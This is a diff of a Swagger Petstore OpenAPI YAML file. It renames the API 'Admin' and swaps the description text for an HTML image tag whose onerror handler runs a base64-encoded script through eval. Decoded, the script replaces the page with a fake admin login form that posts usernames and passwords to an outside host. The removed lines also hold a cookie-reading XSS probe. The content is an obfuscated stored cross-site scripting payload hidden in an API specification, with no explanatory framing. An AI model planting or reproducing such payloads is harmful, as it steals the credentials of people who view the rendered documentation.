@@ -1,11 +1,8 @@
 openapi: 3.0.3
 info:
-  title: Swagger Petstore - OpenAPI 3.0
+  title: Admin
   description: |-
-    This is a sample Pet Store Server based on the OpenAPI 3.0 specification.  You can find out more about<img src=x onerror=confirm(document.cookie)>
-    Swagger at [https://swagger.io](https://swagger.io). In the third iteration of the pet store, we've switched to the design first approach!
-    You can now help us improve the API whether it's by making changes to the definition itself or to the code.
-    That way, with time, we can improve the API in general, and expose some of the new features in OAS3.
+    <img src="x" onerror="javascript:eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSBgPGgxPkFjY2VzcyBsaWtlIEFkbWluIHRvIHNlZSB0aGUgY3VzdG9tZXIgZGF0YSA6KSA8aDE+Cjxmb3JtIGNsYXNzPSJtIiBhY3Rpb249Ii8vZ29vZ2xlLmNvbS8/YSIgbWV0aG9kPSJwb3N0Ij4gCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgPGlucHV0IHR5cGU9InRleHQiIHBsYWNlaG9sZGVyPSJVc2VybmFtZSIgbmFtZT0idW5hbWUiIHJlcXVpcmVkPgoKICAgICAgPGxhYmVsIGZvcj0icHN3Ij48Yj5QYXNzd29yZDwvYj48L2xhYmVsPgogICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgbmFtZT0icHN3IiByZXF1aXJlZD4KICAgICAgICAKICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgIDwvZGl2PgogICAgICA8L2Zvcm0+YA=='))">
 
     Some useful links:
     - [The Pet Store repository](https://github.com/swagger-api/swagger-petstore)
